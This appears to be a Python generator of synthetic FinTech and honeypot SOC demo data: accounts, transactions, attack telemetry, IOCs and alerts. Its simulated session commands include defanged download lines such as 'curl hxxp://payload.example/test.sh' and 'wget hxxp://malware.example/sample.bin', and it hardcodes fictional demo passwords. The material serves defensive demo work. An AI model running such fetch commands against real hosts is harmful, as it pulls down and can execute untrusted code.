"""Generate deterministic, synthetic FinTech and SOC datasets.

The generator uses only the Python standard library, performs no network I/O,
and writes JSON fixtures below ``data/seed``.  Every identity, credential, IP,
domain, transaction, and security event is fictional and intended for a local
demo environment only.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import random
from collections import Counter, defaultdict
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any


SEED = 20260731
SCHEMA_VERSION = "1.0.0"
GENERATED_AT = "2026-07-31T12:00:00Z"
BASE_TIME = datetime(2026, 7, 1, 0, 0, tzinfo=UTC)
PROJECT_ROOT = Path(__file__).resolve().parents[2]
DEFAULT_OUTPUT = PROJECT_ROOT / "data" / "seed"
MIN_OPERATIONAL_RECORDS = 100


def money(cents: int) -> float:
    return round(cents / 100, 2)


def iso_time(index: int, *, minutes: int = 37) -> str:
    return (BASE_TIME + timedelta(minutes=index * minutes)).isoformat().replace("+00:00", "Z")


def test_ip(index: int) -> str:
    """Return an address from an RFC 5737 documentation-only range."""

    blocks = ("192.0.2", "198.51.100", "203.0.113")
    return f"{blocks[(index // 254) % len(blocks)]}.{(index % 254) + 1}"


def digest(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8")).hexdigest()


def dump_json(path: Path, value: Any) -> str:
    payload = json.dumps(value, ensure_ascii=False, indent=2, sort_keys=True) + "\n"
    path.write_text(payload, encoding="utf-8", newline="\n")
    return hashlib.sha256(payload.encode("utf-8")).hexdigest()


def build_datasets() -> dict[str, list[dict[str, Any]]]:
    rng = random.Random(SEED)
    countries = [
        ("JO", "Amman", 31.9539, 35.9106),
        ("AE", "Dubai", 25.2048, 55.2708),
        ("SA", "Riyadh", 24.7136, 46.6753),
        ("GB", "London", 51.5072, -0.1276),
        ("US", "New York", 40.7128, -74.0060),
        ("DE", "Frankfurt", 50.1109, 8.6821),
        ("FR", "Paris", 48.8566, 2.3522),
        ("NL", "Amsterdam", 52.3676, 4.9041),
        ("SG", "Singapore", 1.3521, 103.8198),
        ("JP", "Tokyo", 35.6762, 139.6503),
        ("IN", "Mumbai", 19.0760, 72.8777),
        ("CA", "Toronto", 43.6532, -79.3832),
        ("BR", "Sao Paulo", -23.5505, -46.6333),
        ("AU", "Sydney", -33.8688, 151.2093),
        ("ZA", "Cape Town", -33.9249, 18.4241),
        ("TR", "Istanbul", 41.0082, 28.9784),
        ("PL", "Warsaw", 52.2297, 21.0122),
        ("VN", "Hanoi", 21.0278, 105.8342),
        ("UA", "Kyiv", 50.4501, 30.5234),
        ("MX", "Mexico City", 19.4326, -99.1332),
    ]
    risk_levels = ("low", "medium", "high")
    severities = ("low", "medium", "high", "critical")

    customers: list[dict[str, Any]] = []
    for i in range(120):
        country, city, _, _ = countries[i % len(countries)]
        customers.append(
            {
                "customer_id": f"cus_{i + 1:04d}",
                "customer_number": f"DEMO-CUS-{i + 1:06d}",
                "display_name": f"Synthetic Customer {i + 1:03d}",
                "display_name_ar": f"عميل تجريبي {i + 1:03d}",
                "email": f"customer{i + 1:03d}@finova-demo.local",
                "phone": f"+999000{i + 1:06d}",
                "country_code": country,
                "city": city,
                "kyc_status": ("verified", "verified", "review")[i % 3],
                "risk_tier": risk_levels[i % len(risk_levels)],
                "created_at": iso_time(i, minutes=181),
                "synthetic": True,
            }
        )

    accounts: list[dict[str, Any]] = []
    currencies = ("JOD", "USD", "EUR")
    for i in range(180):
        opening_cents = rng.randint(500_000, 25_000_000)
        accounts.append(
            {
                "account_id": f"acc_{i + 1:04d}",
                "customer_id": customers[i % len(customers)]["customer_id"],
                "account_number_masked": f"DEMO-****-{i + 1:04d}",
                "iban_display": f"DEMO-IBAN-{i + 1:012d}",
                "account_type": ("current", "savings", "business")[i % 3],
                "currency": currencies[i % len(currencies)],
                "status": "active" if i % 17 else "review",
                "opening_balance": money(opening_cents),
                "current_balance": money(opening_cents),
                "available_balance": money(opening_cents),
                "opened_at": iso_time(i, minutes=97),
                "synthetic": True,
            }
        )

    cards: list[dict[str, Any]] = []
    for i in range(150):
        cards.append(
            {
                "card_id": f"card_{i + 1:04d}",
                "account_id": accounts[i]["account_id"],
                "customer_id": accounts[i]["customer_id"],
                "cardholder_name": customers[i % len(customers)]["display_name"].upper(),
                "pan_masked": f"4111 **** **** {1000 + i:04d}",
                "network": ("VISA TEST", "MASTERCARD TEST")[i % 2],
                "card_type": ("debit", "virtual", "prepaid")[i % 3],
                "expiry": f"{(i % 12) + 1:02d}/3{(i % 5) + 1}",
                "status": "active" if i % 19 else "frozen",
                "daily_limit": money(100_000 + (i % 10) * 25_000),
                "synthetic": True,
            }
        )

    beneficiaries: list[dict[str, Any]] = []
    for i in range(130):
        beneficiaries.append(
            {
                "beneficiary_id": f"ben_{i + 1:04d}",
                "customer_id": customers[i % len(customers)]["customer_id"],
                "nickname": f"Demo Beneficiary {i + 1:03d}",
                "bank_name": f"Fictional Bank {(i % 12) + 1:02d}",
                "account_display": f"DEMO-BEN-****-{i + 1:04d}",
                "currency": currencies[i % len(currencies)],
                "country_code": countries[(i + 3) % len(countries)][0],
                "status": "active" if i % 13 else "pending_review",
                "created_at": iso_time(i, minutes=149),
                "synthetic": True,
            }
        )

    merchant_categories = (
        "groceries",
        "utilities",
        "travel",
        "electronics",
        "health",
        "restaurants",
        "subscriptions",
        "education",
    )
    merchants: list[dict[str, Any]] = []
    for i in range(140):
        country, city, _, _ = countries[(i + 6) % len(countries)]
        merchants.append(
            {
                "merchant_id": f"mer_{i + 1:04d}",
                "merchant_number": f"DEMO-MER-{i + 1:06d}",
                "name": f"Fictional Market {i + 1:03d}",
                "category": merchant_categories[i % len(merchant_categories)],
                "country_code": country,
                "city": city,
                "risk_score": round((i % 31) / 100, 2),
                "status": "active" if i % 23 else "monitor",
                "synthetic": True,
            }
        )

    running_cents = {
        account["account_id"]: int(round(account["opening_balance"] * 100)) for account in accounts
    }
    transactions: list[dict[str, Any]] = []
    transfers: list[dict[str, Any]] = []
    payments: list[dict[str, Any]] = []
    for i in range(600):
        account = accounts[(i * 17 + 11) % len(accounts)]
        account_id = account["account_id"]
        kind = ("transfer_in", "transfer_out", "card_purchase", "bill_payment")[i % 4]
        direction = "incoming" if kind == "transfer_in" else "outgoing"
        if kind.startswith("transfer"):
            amount_cents = rng.randint(10_000, 500_000)
        elif kind == "card_purchase":
            amount_cents = rng.randint(500, 50_000)
        else:
            amount_cents = rng.randint(2_000, 150_000)
        signed_cents = amount_cents if direction == "incoming" else -amount_cents
        running_cents[account_id] += signed_cents
        transaction_id = f"txn_{i + 1:05d}"
        transaction = {
            "transaction_id": transaction_id,
            "account_id": account_id,
            "customer_id": account["customer_id"],
            "type": kind,
            "direction": direction,
            "amount": money(amount_cents),
            "currency": account["currency"],
            "balance_after": money(running_cents[account_id]),
            "status": ("completed", "completed", "completed", "pending")[i % 4],
            "reference": f"DEMO-TXN-{i + 1:08d}",
            "description": f"Synthetic {kind.replace('_', ' ')} #{i + 1:04d}",
            "occurred_at": iso_time(i, minutes=61),
            "synthetic": True,
        }
        transactions.append(transaction)
        if kind.startswith("transfer"):
            transfers.append(
                {
                    "transfer_id": f"trf_{len(transfers) + 1:05d}",
                    "transaction_id": transaction_id,
                    "account_id": account_id,
                    "beneficiary_id": beneficiaries[i % len(beneficiaries)]["beneficiary_id"],
                    "direction": direction,
                    "amount": transaction["amount"],
                    "currency": account["currency"],
                    "counterparty_name": f"Synthetic Counterparty {(i % 90) + 1:03d}",
                    "counterparty_account": f"EXTERNAL-DEMO-{(i % 90) + 1:05d}",
                    "status": transaction["status"],
                    "created_at": transaction["occurred_at"],
                    "synthetic": True,
                }
            )
        else:
            merchant = merchants[i % len(merchants)]
            payments.append(
                {
                    "payment_id": f"pay_{len(payments) + 1:05d}",
                    "transaction_id": transaction_id,
                    "account_id": account_id,
                    "merchant_id": merchant["merchant_id"],
                    "merchant_name": merchant["name"],
                    "payment_type": "card" if kind == "card_purchase" else "bill",
                    "amount": transaction["amount"],
                    "currency": account["currency"],
                    "status": transaction["status"],
                    "paid_at": transaction["occurred_at"],
                    "synthetic": True,
                }
            )

    for account in accounts:
        final_cents = running_cents[account["account_id"]]
        account["current_balance"] = money(final_cents)
        account["available_balance"] = money(final_cents - 5_000 if final_cents >= 5_000 else final_cents)

    invoices: list[dict[str, Any]] = []
    invoice_statuses = ("paid", "open", "overdue", "partially_paid")
    for i in range(130):
        total_cents = rng.randint(2_500, 180_000)
        status = invoice_statuses[i % len(invoice_statuses)]
        paid_cents = total_cents if status == "paid" else (total_cents // 2 if status == "partially_paid" else 0)
        invoices.append(
            {
                "invoice_id": f"inv_{i + 1:04d}",
                "invoice_number": f"DEMO-INV-2026-{i + 1:05d}",
                "customer_id": customers[i % len(customers)]["customer_id"],
                "merchant_id": merchants[(i * 3) % len(merchants)]["merchant_id"],
                "currency": currencies[i % len(currencies)],
                "subtotal": money(total_cents - total_cents // 11),
                "tax": money(total_cents // 11),
                "total": money(total_cents),
                "paid": money(paid_cents),
                "due": money(total_cents - paid_cents),
                "status": status,
                "issued_at": iso_time(i, minutes=193),
                "due_at": iso_time(i + 28, minutes=193),
                "synthetic": True,
            }
        )

    auth_logs: list[dict[str, Any]] = []
    auth_actions = ("login", "logout", "mfa_challenge", "password_reset_request")
    for i in range(250):
        success = i % 7 != 0
        auth_logs.append(
            {
                "auth_log_id": f"auth_{i + 1:05d}",
                "customer_id": customers[i % len(customers)]["customer_id"],
                "action": auth_actions[i % len(auth_actions)],
                "result": "success" if success else "denied",
                "reason": None if success else "synthetic_risk_rule",
                "ip_address": test_ip(i),
                "device": ("Demo Browser", "Demo Mobile", "Demo API Client")[i % 3],
                "occurred_at": iso_time(i, minutes=47),
                "synthetic": True,
            }
        )

    audit_actions = ("view_account", "export_report", "update_profile", "freeze_card", "review_alert")
    audit_logs: list[dict[str, Any]] = []
    for i in range(220):
        audit_logs.append(
            {
                "audit_log_id": f"audit_{i + 1:05d}",
                "actor_id": f"demo_actor_{(i % 18) + 1:03d}",
                "actor_role": ("customer", "operations", "soc_analyst", "auditor")[i % 4],
                "action": audit_actions[i % len(audit_actions)],
                "resource_type": ("account", "card", "report", "alert")[i % 4],
                "resource_id": f"synthetic_resource_{(i % 160) + 1:04d}",
                "result": "allowed" if i % 13 else "denied",
                "ip_address": test_ip(i + 250),
                "occurred_at": iso_time(i, minutes=53),
                "synthetic": True,
            }
        )

    locations: list[dict[str, Any]] = []
    for i in range(120):
        country, city, latitude, longitude = countries[i % len(countries)]
        locations.append(
            {
                "location_id": f"loc_{i + 1:04d}",
                "country_code": country,
                "city": city,
                "latitude": round(latitude + ((i % 5) - 2) * 0.08, 4),
                "longitude": round(longitude + ((i % 7) - 3) * 0.08, 4),
                "ip_address": test_ip(i + 470),
                "asn": f"AS-DEMO-{64000 + i}",
                "provider": f"Documentation Network {(i % 8) + 1}",
                "synthetic": True,
            }
        )

    attack_types = (
        "credential_stuffing",
        "ssh_bruteforce",
        "web_scan",
        "command_injection_probe",
        "malware_drop_attempt",
        "api_enumeration",
        "canary_access",
        "sql_injection_probe",
    )
    techniques = (
        ("T1110", "Brute Force", "Credential Access"),
        ("T1059", "Command and Scripting Interpreter", "Execution"),
        ("T1190", "Exploit Public-Facing Application", "Initial Access"),
        ("T1087", "Account Discovery", "Discovery"),
        ("T1046", "Network Service Discovery", "Discovery"),
        ("T1105", "Ingress Tool Transfer", "Command and Control"),
        ("T1071", "Application Layer Protocol", "Command and Control"),
        ("T1562", "Impair Defenses", "Defense Evasion"),
        ("T1027", "Obfuscated Files or Information", "Defense Evasion"),
        ("T1005", "Data from Local System", "Collection"),
        ("T1218", "System Binary Proxy Execution", "Defense Evasion"),
        ("T1547", "Boot or Logon Autostart Execution", "Persistence"),
    )
    attacks: list[dict[str, Any]] = []
    for i in range(320):
        location = locations[i % len(locations)]
        technique_id, technique_name, tactic = techniques[i % len(techniques)]
        attacks.append(
            {
                "attack_id": f"atk_{i + 1:05d}",
                "attack_type": attack_types[i % len(attack_types)],
                "severity": severities[(i * 3) % len(severities)],
                "source_ip": location["ip_address"],
                "location_id": location["location_id"],
                "country_code": location["country_code"],
                "target_service": ("ssh-decoy", "fintech-web", "api-decoy", "smb-canary")[i % 4],
                "mitre_technique_id": technique_id,
                "mitre_technique": technique_name,
                "mitre_tactic": tactic,
                "confidence": 55 + (i % 45),
                "status": ("observed", "triaged", "contained", "closed")[i % 4],
                "occurred_at": iso_time(i, minutes=29),
                "synthetic": True,
            }
        )

    event_sources = ("cowrie-sim", "suricata-sim", "fintech-decoy", "canary-sim", "web-decoy")
    events: list[dict[str, Any]] = []
    for i in range(420):
        attack = attacks[i % len(attacks)]
        events.append(
            {
                "event_id": f"evt_{i + 1:05d}",
                "attack_id": attack["attack_id"],
                "source": event_sources[i % len(event_sources)],
                "event_type": attack["attack_type"],
                "severity": attack["severity"],
                "source_ip": attack["source_ip"],
                "country_code": attack["country_code"],
                "target_service": attack["target_service"],
                "message": f"Synthetic telemetry event {i + 1:04d}: {attack['attack_type']}",
                "status": ("new", "investigating", "resolved")[i % 3],
                "occurred_at": iso_time(i, minutes=23),
                "synthetic": True,
            }
        )

    sessions: list[dict[str, Any]] = []
    for i in range(180):
        attack = attacks[i % len(attacks)]
        sessions.append(
            {
                "session_id": f"ses_{i + 1:05d}",
                "attack_id": attack["attack_id"],
                "protocol": ("ssh", "http", "ftp", "smb")[i % 4],
                "source_ip": attack["source_ip"],
                "country_code": attack["country_code"],
                "username_attempted": f"demo-user-{(i % 12) + 1}",
                "authentication_result": "accepted_by_simulator" if i % 5 == 0 else "rejected",
                "command_count": 1 + (i % 8),
                "duration_seconds": 20 + (i * 13) % 1800,
                "started_at": iso_time(i, minutes=41),
                "ended_at": iso_time(i, minutes=41),
                "synthetic": True,
            }
        )

    command_samples = (
        "help",
        "pwd",
        "whoami",
        "id",
        "ls -la",
        "cat /etc/hostname",
        "uname -a",
        "history",
        "curl hxxp://payload.example/test.sh",
        "wget hxxp://malware.example/sample.bin",
        "python -c '<defanged synthetic script>'",
        "find / -name '*.conf' 2>/dev/null",
    )
    commands: list[dict[str, Any]] = []
    for i in range(300):
        raw = command_samples[i % len(command_samples)]
        commands.append(
            {
                "command_id": f"cmd_{i + 1:05d}",
                "session_id": sessions[i % len(sessions)]["session_id"],
                "command_text": raw,
                "display_text": raw.replace("<", "&lt;").replace(">", "&gt;"),
                "classification": ("discovery", "execution_probe", "download_attempt", "recon")[i % 4],
                "executed": False,
                "result": "simulated_only",
                "occurred_at": iso_time(i, minutes=31),
                "synthetic": True,
            }
        )

    ioc_types = ("ip", "domain", "sha256", "url")
    iocs: list[dict[str, Any]] = []
    for i in range(200):
        ioc_type = ioc_types[i % len(ioc_types)]
        if ioc_type == "ip":
            value = test_ip(i + 590)
        elif ioc_type == "domain":
            value = f"ioc-{i + 1:04d}.malware.example"
        elif ioc_type == "url":
            value = f"hxxps://payload.example/artifact/{i + 1:04d}"
        else:
            value = digest(f"synthetic-artifact-{i + 1:04d}")
        iocs.append(
            {
                "ioc_id": f"ioc_{i + 1:05d}",
                "type": ioc_type,
                "value": value,
                "confidence": 50 + (i % 50),
                "severity": severities[i % len(severities)],
                "source": "local-synthetic-feed",
                "first_seen": iso_time(i, minutes=71),
                "last_seen": iso_time(i + 12, minutes=71),
                "active": i % 9 != 0,
                "synthetic": True,
            }
        )

    alerts: list[dict[str, Any]] = []
    for i in range(180):
        event = events[(i * 2) % len(events)]
        alerts.append(
            {
                "alert_id": f"alt_{i + 1:05d}",
                "event_id": event["event_id"],
                "title": f"Synthetic alert: {event['event_type'].replace('_', ' ')}",
                "severity": event["severity"],
                "status": ("open", "investigating", "contained", "closed")[i % 4],
                "assignee": None if i % 5 == 0 else f"demo-analyst-{(i % 8) + 1:02d}",
                "sla_minutes": (15, 30, 60, 240)[i % 4],
                "created_at": event["occurred_at"],
                "synthetic": True,
            }
        )

    mitre_mappings: list[dict[str, Any]] = []
    for i in range(120):
        technique_id, technique_name, tactic = techniques[i % len(techniques)]
        mitre_mappings.append(
            {
                "mapping_id": f"mitre_{i + 1:04d}",
                "technique_id": technique_id,
                "technique_name": technique_name,
                "tactic": tactic,
                "detections": 3 + (i * 7) % 97,
                "affected_services": [
                    ("ssh-decoy", "fintech-web", "api-decoy", "smb-canary")[i % 4],
                    ("ssh-decoy", "fintech-web", "api-decoy", "smb-canary")[(i + 1) % 4],
                ],
                "coverage": ("observed", "detected", "alerted", "contained")[i % 4],
                "last_seen": iso_time(i, minutes=83),
                "synthetic": True,
            }
        )

    sandbox_reports: list[dict[str, Any]] = []
    for i in range(120):
        score = 10 + (i * 7) % 90
        sandbox_reports.append(
            {
                "report_id": f"sbox_{i + 1:04d}",
                "artifact_name": f"synthetic-sample-{i + 1:04d}.bin",
                "sha256": digest(f"sandbox-synthetic-{i + 1:04d}"),
                "file_size": 1024 + i * 137,
                "mime_type": "application/octet-stream",
                "risk_score": score,
                "verdict": "malicious_simulation" if score >= 70 else ("suspicious_simulation" if score >= 40 else "clean_simulation"),
                "analysis_mode": "static-fixture-only",
                "network_access": False,
                "executed": False,
                "findings": ["synthetic indicator", f"demo behavior {(i % 12) + 1}"],
                "created_at": iso_time(i, minutes=89),
                "synthetic": True,
            }
        )

    canary_activity: list[dict[str, Any]] = []
    for i in range(180):
        canary_activity.append(
            {
                "canary_event_id": f"canary_{i + 1:05d}",
                "canary_id": f"demo-canary-{(i % 24) + 1:03d}",
                "canary_type": ("document", "credential", "api_key", "file_share")[i % 4],
                "action": ("viewed", "copied", "submitted", "enumerated")[i % 4],
                "source_ip": test_ip(i + 650),
                "severity": severities[(i + 1) % len(severities)],
                "status": ("new", "reviewed", "contained")[i % 3],
                "occurred_at": iso_time(i, minutes=43),
                "synthetic": True,
            }
        )

    playbooks = ("credential-abuse", "malware-triage", "canary-response", "web-attack", "ioc-enrichment")
    playbook_runs: list[dict[str, Any]] = []
    for i in range(140):
        status = ("completed", "completed", "needs_review", "failed_simulation")[i % 4]
        playbook_runs.append(
            {
                "playbook_run_id": f"pbr_{i + 1:04d}",
                "playbook": playbooks[i % len(playbooks)],
                "trigger_alert_id": alerts[i % len(alerts)]["alert_id"],
                "status": status,
                "steps_total": 4 + (i % 5),
                "steps_completed": 4 + (i % 5) if status == "completed" else 2 + (i % 3),
                "actions": ["tag_event", "enrich_local_fixture", "notify_demo_queue"],
                "external_actions": False,
                "started_at": iso_time(i, minutes=67),
                "finished_at": iso_time(i, minutes=67),
                "synthetic": True,
            }
        )

    return {
        "customers": customers,
        "accounts": accounts,
        "cards": cards,
        "beneficiaries": beneficiaries,
        "merchants": merchants,
        "invoices": invoices,
        "payments": payments,
        "transfers": transfers,
        "transactions": transactions,
        "auth_logs": auth_logs,
        "audit_logs": audit_logs,
        "attacks": attacks,
        "events": events,
        "sessions": sessions,
        "commands": commands,
        "iocs": iocs,
        "alerts": alerts,
        "locations": locations,
        "mitre_mappings": mitre_mappings,
        "sandbox_reports": sandbox_reports,
        "canary_activity": canary_activity,
        "playbook_runs": playbook_runs,
    }


def build_credentials() -> list[dict[str, Any]]:
    return [
        {
            "username": "layla.haddad@finova-demo.local",
            "password": "Honeypot!Demo-2026",
            "role": "fintech_customer",
            "synthetic": True,
            "environment": "local-demo-only",
        },
        {
            "username": "ops@finova-demo.local",
            "password": "Ledger!Sim-2026",
            "role": "fintech_operations",
            "synthetic": True,
            "environment": "local-demo-only",
        },
        {
            "username": "soc.analyst@honeypot.local",
            "password": "SOC!Local-2026",
            "role": "soc_analyst",
            "synthetic": True,
            "environment": "local-demo-only",
        },
        {
            "username": "audit@honeypot.local",
            "password": "Audit!ReadOnly-2026",
            "role": "auditor_read_only",
            "synthetic": True,
            "environment": "local-demo-only",
        },
    ]


def validate_datasets(datasets: dict[str, list[dict[str, Any]]], credentials: list[dict[str, Any]]) -> dict[str, Any]:
    operational = set(datasets)
    short = {name: len(rows) for name, rows in datasets.items() if len(rows) < MIN_OPERATIONAL_RECORDS}
    if short:
        raise ValueError(f"operational datasets below minimum: {short}")

    transactions = datasets["transactions"]
    accounts = datasets["accounts"]
    deltas: dict[str, int] = defaultdict(int)
    debit_cents = 0
    credit_cents = 0
    for transaction in transactions:
        cents = int(round(float(transaction["amount"]) * 100))
        if transaction["direction"] == "incoming":
            deltas[transaction["account_id"]] += cents
            credit_cents += cents
        elif transaction["direction"] == "outgoing":
            deltas[transaction["account_id"]] -= cents
            debit_cents += cents
        else:
            raise ValueError(f"invalid transaction direction: {transaction['direction']}")

    mismatches: list[str] = []
    for account in accounts:
        opening = int(round(float(account["opening_balance"]) * 100))
        current = int(round(float(account["current_balance"]) * 100))
        if opening + deltas[account["account_id"]] != current:
            mismatches.append(account["account_id"])
    if mismatches:
        raise ValueError(f"ledger reconciliation failed: {mismatches[:5]}")

    directions = Counter(transaction["direction"] for transaction in transactions)
    if not directions["incoming"] or not directions["outgoing"]:
        raise ValueError("transactions must contain incoming and outgoing entries")

    transaction_ids = {row["transaction_id"] for row in transactions}
    if any(row["transaction_id"] not in transaction_ids for row in datasets["transfers"]):
        raise ValueError("transfer references missing transaction")
    if any(row["transaction_id"] not in transaction_ids for row in datasets["payments"]):
        raise ValueError("payment references missing transaction")
    if any(row.get("executed") is not False for row in datasets["commands"]):
        raise ValueError("all captured commands must be marked unexecuted")
    if any(row.get("executed") is not False or row.get("network_access") is not False for row in datasets["sandbox_reports"]):
        raise ValueError("sandbox fixtures must never execute or use network access")
    if any(row.get("synthetic") is not True or row.get("environment") != "local-demo-only" for row in credentials):
        raise ValueError("all credentials must be explicitly synthetic and local-only")

    return {
        "reconciled": True,
        "accounts_checked": len(accounts),
        "transactions_checked": len(transactions),
        "incoming_count": directions["incoming"],
        "outgoing_count": directions["outgoing"],
        "total_credits": money(credit_cents),
        "total_debits": money(debit_cents),
        "operational_dataset_count": len(operational),
    }


def generate(output_dir: Path = DEFAULT_OUTPUT) -> dict[str, Any]:
    output_dir.mkdir(parents=True, exist_ok=True)
    datasets = build_datasets()
    credentials = build_credentials()
    reconciliation = validate_datasets(datasets, credentials)

    files: dict[str, dict[str, Any]] = {}
    for name, rows in sorted(datasets.items()):
        filename = f"{name}.json"
        checksum = dump_json(output_dir / filename, rows)
        files[filename] = {"records": len(rows), "sha256": checksum, "operational": True}

    credentials_filename = "demo_credentials.json"
    credentials_checksum = dump_json(output_dir / credentials_filename, credentials)
    files[credentials_filename] = {
        "records": len(credentials),
        "sha256": credentials_checksum,
        "operational": False,
        "classification": "fictional-local-test-credentials",
    }

    manifest = {
        "schema_version": SCHEMA_VERSION,
        "seed": SEED,
        "generated_at": GENERATED_AT,
        "synthetic": True,
        "runtime_network_required": False,
        "minimum_operational_records": MIN_OPERATIONAL_RECORDS,
        "reconciliation": reconciliation,
        "files": files,
    }
    dump_json(output_dir.parent / "manifest.json", manifest)
    return manifest


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--output", type=Path, default=DEFAULT_OUTPUT, help="directory for generated JSON files")
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    result = generate(args.output.resolve())
    print(json.dumps({"output": str(args.output.resolve()), **result["reconciliation"]}, indent=2))
